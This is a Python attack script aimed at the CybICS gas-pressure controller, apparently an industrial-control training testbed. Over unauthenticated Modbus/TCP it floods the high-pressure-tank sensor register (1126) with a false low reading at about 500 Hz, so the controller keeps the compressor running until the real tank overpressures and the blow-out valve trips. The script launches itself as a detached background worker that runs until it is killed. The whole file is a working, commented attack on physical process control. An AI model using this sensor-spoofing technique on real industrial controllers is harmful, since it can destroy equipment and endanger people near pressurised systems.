#!/usr/bin/env python3
"""
Overpressure attack on the CybICS gas-pressure controller.

The controller runs a closed loop: it reads the high-pressure-tank (HPT) sensor
and turns the compressor on when the tank looks low. By continuously writing a
LOW value to the HPT sensor register (1126) over Modbus, we make the controller
believe the tank is nearly empty, so it holds the compressor ON. The real tank
fills past the mechanical relief limit and the blow-out valve trips.

Usage: overpressure.py [PLC_IP]        (launches a detached flooding worker)
       overpressure.py --worker [IP]   (the worker itself; runs until killed)
"""
import sys, os, time
from pymodbus.client import ModbusTcpClient

args = [a for a in sys.argv[1:]]
IP = next((a for a in args if not a.startswith("--")), "172.18.0.3")

def worker(ip):
    # Hammer only the HPT sensor (1126). ~500 Hz beats the ~50 Hz controller
    # scan so the spoof wins nearly every scan and the compressor stays on.
    # We deliberately do NOT touch the reservoir sensor: if the controller
    # thought the reservoir was empty it would refuse to run the compressor.
    c = ModbusTcpClient(ip, port=502); c.connect()
    while True:
        try:
            c.write_register(1126, 10)
        except Exception:
            try: c.connect()
            except Exception: pass
        time.sleep(0.002)

if "--worker" in args:
    worker(IP); sys.exit(0)

already = os.popen(f"ps -eo args | grep -F 'overpressure.py --worker {IP}' | grep -v grep").read().strip()
print("[*] OVERPRESSURE ATTACK on the OpenPLC gas-pressure controller")
print(f"[*] target PLC : {IP}:502  (Modbus/TCP, no authentication)")
print("[*] technique  : spoof the HPT pressure sensor -> hold register 1126 = 10 bar")
print("[*] effect     : the controller reads a LOW pressure and holds the compressor ON;")
print("                 the real tank keeps filling with no relief")
if already:
    print("[*] flooding worker already running - the attack is underway")
else:
    print("[*] launching the flooding worker in the background ...")
    os.system(f"setsid python3 {os.path.abspath(__file__)} --worker {IP} >/tmp/overpressure.log 2>&1 &")
time.sleep(2)
running = os.popen(f"ps -eo args | grep -F 'overpressure.py --worker {IP}' | grep -v grep").read().strip()
print(f"[+] attack running{' (worker active)' if running else ''} - writing HPT sensor = 10 bar continuously")
print("[+] the compressor is forced on; watch the real pressure climb to the blow-out point")
